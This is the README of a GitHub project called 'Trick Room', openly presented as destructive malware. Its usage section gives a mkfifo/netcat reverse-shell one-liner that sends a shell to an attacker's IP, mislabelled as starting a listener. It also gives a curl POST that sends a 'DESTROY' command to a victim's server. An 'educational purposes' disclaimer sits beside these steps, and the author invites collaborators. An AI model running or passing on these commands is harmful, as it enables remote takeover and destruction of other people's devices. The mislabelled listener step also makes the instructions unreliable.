## Trick Room
The Most Advanced Malware Ever Made!

## Creators

- [@LotusEmpire](https://www.github.com/lotusempire64) 





## Installation

```bash
git clone https://github.com/lotusempire64/Trick_Room 
cd Trick_Room  
```
## Warning! 
Don't Run On Your Own Computer, Use Only For Educational Purposes As This Virus Has The Potential To Cause Severe Harm 

## Usage 
Step 1: Start a netcat listener: 
```bash 
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc youriphere 8080 >/tmp/f
``` 
Step 2: Use post requests to controll target, it will send back the server IP 
Example Of Post Request To Destroy Victims Device: 
```bash 
curl victimserveriphere -X POST -d DESTROY 
``` 
## This Is A Work In Progress 
If you have any features you want added, find any bugs, or would like to colaborate on this project, email me here: lotusempire6@gmail.com
